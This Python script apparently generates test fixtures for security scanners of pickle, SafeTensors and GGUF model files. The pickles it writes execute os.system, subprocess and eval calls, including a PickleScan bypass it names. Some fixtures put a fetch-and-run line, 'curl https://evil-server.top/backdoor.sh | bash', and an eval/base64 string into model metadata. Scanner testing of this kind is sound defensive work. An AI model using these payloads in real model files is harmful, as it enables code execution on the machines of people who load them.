"""
Generate binary test fixtures for pickle, safetensors, and GGUF scanners.
Run once to create fixture files in tests/fixtures/binary/.
"""
import json
import os
import pickle
import struct
import sys

FIXTURES_DIR = os.path.join(os.path.dirname(__file__), "fixtures", "binary")
os.makedirs(FIXTURES_DIR, exist_ok=True)


# === PICKLE FIXTURES ===

def create_malicious_pickle_os_system():
    """
    Craft a pickle that calls os.system("whoami") via GLOBAL + REDUCE opcodes.
    Protocol 0 for maximum clarity.
    """
    # Protocol 0 pickle calling os.system("whoami")
    payload = (
        b"cos\nsystem\n"       # GLOBAL: push os.system
        b"(S'whoami'\n"        # MARK + STRING "whoami"
        b"tR"                  # TUPLE + REDUCE (call os.system("whoami"))
        b"."                   # STOP
    )
    path = os.path.join(FIXTURES_DIR, "malicious_os_system.pkl")
    with open(path, "wb") as f:
        f.write(payload)
    print(f"  Created: {path}")


def create_malicious_pickle_subprocess():
    """Pickle calling subprocess.check_output."""
    payload = (
        b"csubprocess\ncheck_output\n"  # GLOBAL: subprocess.check_output
        b"((S'powershell'\n"             # args
        b"S'-enc'\n"
        b"S'ZWNobyBoYWNrZWQ='\n"
        b"ltR"                            # LIST + TUPLE + REDUCE
        b"."
    )
    path = os.path.join(FIXTURES_DIR, "malicious_subprocess.pkl")
    with open(path, "wb") as f:
        f.write(payload)
    print(f"  Created: {path}")


def create_malicious_pickle_eval():
    """Pickle calling builtins.eval."""
    payload = (
        b"cbuiltins\neval\n"
        b"(S'__import__(\"os\").system(\"id\")'\n"
        b"tR."
    )
    path = os.path.join(FIXTURES_DIR, "malicious_eval.pkl")
    with open(path, "wb") as f:
        f.write(payload)
    print(f"  Created: {path}")


def create_malicious_pickle_reduce_ex():
    """Pickle using __reduce_ex__ bypass pattern (protocol 2)."""
    # Protocol 2 with STACK_GLOBAL (known PickleScan bypass)
    payload = (
        b"\x80\x02"  # PROTO 2
        b"\x8c\x02os"  # SHORT_BINUNICODE "os"
        b"\x8c\x06system"  # SHORT_BINUNICODE "system"
        b"\x93"  # STACK_GLOBAL (os.system)
        b"\x8c\x06whoami"  # SHORT_BINUNICODE "whoami"
        b"\x85"  # TUPLE1
        b"R"  # REDUCE
        b"."  # STOP
    )
    path = os.path.join(FIXTURES_DIR, "malicious_stack_global.pkl")
    with open(path, "wb") as f:
        f.write(payload)
    print(f"  Created: {path}")


def create_corrupted_pickle():
    """
    Deliberately corrupted pickle that has globals but breaks mid-parse.
    This is a known PickleScan bypass: malware executes during partial deserialization.
    """
    payload = (
        b"\x80\x02"
        b"\x8c\x02os"
        b"\x8c\x06system"
        b"\x93"
        b"\x8c\x06whoami"
        b"\x85"
        b"R"
        # No STOP — truncated
        b"\xff\xff\xff"  # Garbage bytes
    )
    path = os.path.join(FIXTURES_DIR, "corrupted_with_globals.pkl")
    with open(path, "wb") as f:
        f.write(payload)
    print(f"  Created: {path}")


def create_safe_torch_pickle():
    """
    A safe PyTorch-style pickle (just torch._utils._rebuild_tensor_v2).
    """
    payload = (
        b"\x80\x02"
        b"\x8c\x1ctorch._utils._rebuild_tensor_v2"
        b"\x8c\x18_rebuild_tensor_v2"  # Unused but shows legitimate pattern
        b"."
    )
    path = os.path.join(FIXTURES_DIR, "safe_torch_model.pkl")
    with open(path, "wb") as f:
        f.write(payload)
    print(f"  Created: {path}")


# === SAFETENSORS FIXTURES ===

def create_safe_safetensors():
    """Valid SafeTensors file with clean metadata."""
    header = {
        "__metadata__": {
            "format": "pt",
            "author": "test-org",
        },
        "weight": {
            "dtype": "F32",
            "shape": [4, 4],
            "data_offsets": [0, 64],
        },
    }
    header_bytes = json.dumps(header).encode("utf-8")
    header_size = struct.pack("<Q", len(header_bytes))
    # 64 bytes of fake tensor data (4x4 float32)
    tensor_data = b"\x00" * 64
    path = os.path.join(FIXTURES_DIR, "safe_model.safetensors")
    with open(path, "wb") as f:
        f.write(header_size + header_bytes + tensor_data)
    print(f"  Created: {path}")


def create_malicious_safetensors_metadata():
    """SafeTensors with injected URL in metadata."""
    header = {
        "__metadata__": {
            "format": "pt",
            "custom_hook": "https://evil-c2-server.top/payload.sh",
            "description": "eval(base64.b64decode('aW1wb3J0IG9z'))",
        },
        "weight": {
            "dtype": "F32",
            "shape": [2, 2],
            "data_offsets": [0, 16],
        },
    }
    header_bytes = json.dumps(header).encode("utf-8")
    header_size = struct.pack("<Q", len(header_bytes))
    tensor_data = b"\x00" * 16
    path = os.path.join(FIXTURES_DIR, "malicious_metadata.safetensors")
    with open(path, "wb") as f:
        f.write(header_size + header_bytes + tensor_data)
    print(f"  Created: {path}")


def create_oversized_safetensors_header():
    """SafeTensors with abnormally large header (payload staging)."""
    # Create a header with a huge metadata value
    big_value = "A" * 200_000  # 200KB of garbage in metadata
    header = {
        "__metadata__": {
            "hidden_payload": big_value,
        },
        "weight": {
            "dtype": "F32",
            "shape": [1],
            "data_offsets": [0, 4],
        },
    }
    header_bytes = json.dumps(header).encode("utf-8")
    header_size = struct.pack("<Q", len(header_bytes))
    tensor_data = b"\x00" * 4
    path = os.path.join(FIXTURES_DIR, "oversized_header.safetensors")
    with open(path, "wb") as f:
        f.write(header_size + header_bytes + tensor_data)
    print(f"  Created: {path}")


def create_malformed_safetensors():
    """Invalid SafeTensors — header size exceeds file."""
    # Claim 1MB header but file is tiny
    header_size = struct.pack("<Q", 1_000_000)
    path = os.path.join(FIXTURES_DIR, "malformed.safetensors")
    with open(path, "wb") as f:
        f.write(header_size + b"not enough data")
    print(f"  Created: {path}")


# === GGUF FIXTURES ===

def _write_gguf_string(f, s: str):
    """Write a GGUF string (uint64 len + utf8 bytes)."""
    encoded = s.encode("utf-8")
    f.write(struct.pack("<Q", len(encoded)))
    f.write(encoded)


def create_safe_gguf():
    """Valid GGUF file with benign metadata."""
    path = os.path.join(FIXTURES_DIR, "safe_model.gguf")
    with open(path, "wb") as f:
        # Magic + version + tensor_count + kv_count
        f.write(struct.pack("<I", 0x46475547))  # "GGUF"
        f.write(struct.pack("<I", 3))  # version 3
        f.write(struct.pack("<Q", 1))  # 1 tensor
        f.write(struct.pack("<Q", 2))  # 2 kv pairs

        # KV 1: general.architecture = "llama" (string type = 8)
        _write_gguf_string(f, "general.architecture")
        f.write(struct.pack("<I", 8))  # type STRING
        _write_gguf_string(f, "llama")

        # KV 2: general.name = "test-model" (string type = 8)
        _write_gguf_string(f, "general.name")
        f.write(struct.pack("<I", 8))  # type STRING
        _write_gguf_string(f, "test-model")
    print(f"  Created: {path}")


def create_malicious_gguf():
    """GGUF with suspicious URLs in metadata."""
    path = os.path.join(FIXTURES_DIR, "malicious_metadata.gguf")
    with open(path, "wb") as f:
        f.write(struct.pack("<I", 0x46475547))  # "GGUF"
        f.write(struct.pack("<I", 3))  # version 3
        f.write(struct.pack("<Q", 0))  # 0 tensors
        f.write(struct.pack("<Q", 2))  # 2 kv pairs

        # KV 1: benign
        _write_gguf_string(f, "general.architecture")
        f.write(struct.pack("<I", 8))
        _write_gguf_string(f, "llama")

        # KV 2: suspicious — hidden C2 URL
        _write_gguf_string(f, "custom.post_load_hook")
        f.write(struct.pack("<I", 8))
        _write_gguf_string(f, "curl https://evil-server.top/backdoor.sh | bash")
    print(f"  Created: {path}")


def create_malformed_gguf():
    """Invalid GGUF — wrong magic number."""
    path = os.path.join(FIXTURES_DIR, "malformed.gguf")
    with open(path, "wb") as f:
        f.write(b"BAAD")  # Wrong magic
        f.write(b"\x00" * 20)
    print(f"  Created: {path}")


if __name__ == "__main__":
    print("Generating binary test fixtures...")
    print("\n[Pickle fixtures]")
    create_malicious_pickle_os_system()
    create_malicious_pickle_subprocess()
    create_malicious_pickle_eval()
    create_malicious_pickle_reduce_ex()
    create_corrupted_pickle()
    create_safe_torch_pickle()

    print("\n[SafeTensors fixtures]")
    create_safe_safetensors()
    create_malicious_safetensors_metadata()
    create_oversized_safetensors_header()
    create_malformed_safetensors()

    print("\n[GGUF fixtures]")
    create_safe_gguf()
    create_malicious_gguf()
    create_malformed_gguf()

    print(f"\nDone! All fixtures in: {FIXTURES_DIR}")
